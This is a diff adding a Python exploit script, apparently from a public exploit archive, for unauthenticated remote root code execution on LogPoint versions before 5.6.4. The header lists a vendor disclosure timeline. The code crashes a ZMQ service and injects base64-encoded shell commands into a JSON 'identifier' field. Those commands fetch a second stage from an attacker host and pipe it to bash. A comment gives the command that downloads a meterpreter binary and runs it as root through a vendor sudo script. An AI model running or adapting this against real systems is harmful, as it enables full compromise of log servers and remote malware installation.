@@ -1,0 +1,62 @@
+# Exploit Title: Unauthenticated remote root code execution on logpoint < 5.6.4
+# Date: 11/06/17
+# Exploit Author: agix
+# Vendor Homepage: https://www.logpoint.com
+# Version: logpoint < 5.6.4
+# Tested on: 5.6.2
+
+# Vendor contact 19/04
+# Exploit details sent to the vendor 24/04
+# Patch in test mode 05/05
+# Patch release to public 08/05
+
+
+# run python -m SimpleHTTPServer to serve second stage of the exploit in a file named e
+# to get root code execution this is the second stage e
+# wget http://YOUR_WEB_SERVER:8000/meterpreter -O /tmp/met && chmod 755 /tmp/met && sudo /opt/immune/installed/system/root_actions/create_symlink.sh /tmp/met /opt/immune/installed/system/root_actions/met ; sudo /opt/immune/installed/system/root_actions/met
+# it downloads a third stage executed as root
+
+import time
+import zmq
+import sys
+import json
+import random
+import string
+import base64
+
+ATTACKER_IP = '172.16.171.1'
+LOGPOINT_IP = '172.16.171.204'
+
+def crash():
+    context = zmq.Context()
+    sock = context.socket(zmq.DEALER)
+    sock.connect("tcp://%s:5504"%LOGPOINT_IP)
+    sock.send('crash')
+
+crash()
+time.sleep(1)
+
+context = zmq.Context()
+
+sock2 = context.socket(zmq.DEALER)
+sock2.connect("tcp://%s:5504"%LOGPOINT_IP)
+
+name = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+
+cmd1 = base64.b64encode('wget http://%s:8000/e -O /tmp/e'%ATTACKER_IP)
+cmd2 = base64.b64encode('cat /tmp/e')
+
+exploit = '%s"; $(echo -n %s | base64 -d) && $(echo -n %s | base64 -d) | bash ; echo "test'%(name, cmd1, cmd2)
+
+tosend = json.dumps({"request_id": name, "query": "high_availability", "query_info": {"store_front_port": 5500, "action": "add", "ip": ATTACKER_IP, "days": 12, "repo_name": name, "identifier": exploit}})
+print tosend
+sock2.send(tosend)
+print sock2.recv()
+
+time.sleep(30)
+
+# cleaning
+tosend = json.dumps({"request_id": name+"-1", "query": "high_availability", "query_info": {"store_front_port": 5500, "action": "delete", "ip": ATTACKER_IP, "days": 12, "repo_name": name, "identifier": exploit}})
+print tosend
+sock2.send(tosend)
+print sock2.recv()
